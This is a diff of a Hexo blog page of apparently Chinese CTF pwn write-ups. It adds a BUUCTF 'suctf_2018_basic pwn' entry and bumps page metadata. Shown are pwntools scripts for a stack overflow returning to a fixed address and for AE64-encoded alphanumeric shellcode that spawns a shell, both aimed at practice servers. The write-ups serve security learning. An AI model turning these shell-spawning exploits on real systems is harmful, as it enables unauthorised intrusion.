@@ -1574,7 +1574,7 @@ Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-03 17:15:27" itemprop="dateModified" datetime="2023-03-03T17:15:27+08:00">2023-03-03</time>
+                <time title="Modified: 2023-03-04 11:04:30" itemprop="dateModified" datetime="2023-03-04T11:04:30+08:00">2023-03-04</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1596,7 +1596,7 @@ Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>9.8k</span>
+              <span>10k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
@@ -1654,6 +1654,9 @@ unlink之后可以直接通过第一个chunk读取到stdin的地址，从而获�
 <h1 id="buu081-mrctf2020_shellcode_revenge"><a class="markdownIt-Anchor" href="#buu081-mrctf2020_shellcode_revenge"></a> buu081-mrctf2020_shellcode_revenge</h1>
 <p>单纯的一个只允许使用字母和数字的shellcode，使用ae64可直接获取。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process([&#x27;./mrctf2020_shellcode_revenge&#x27;])</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25890</span>)</span><br><span class="line"></span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">shellcode = AE64().encode(asm(shellcraft.amd64.sh()), <span class="string">&#x27;rax&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    sa(<span class="string">b&#x27;Show me your magic!\n&#x27;</span>, shellcode)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu082-suctf_2018_basic-pwn"><a class="markdownIt-Anchor" href="#buu082-suctf_2018_basic-pwn"></a> buu082-suctf_2018_basic pwn</h1>
+<p>最简单的栈溢出。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./SUCTF_2018_basic_pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29234</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./SUCTF_2018_basic_pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(cyclic(<span class="number">0x110</span> + <span class="number">8</span>) + p64(<span class="number">0x401157</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -2045,7 +2048,7 @@ unlink之后可以直接通过第一个chunk读取到stdin的地址，从而获�
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
-    <span title="Reading time total">17:08</span>
+    <span title="Reading time total">17:09</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
   </div>
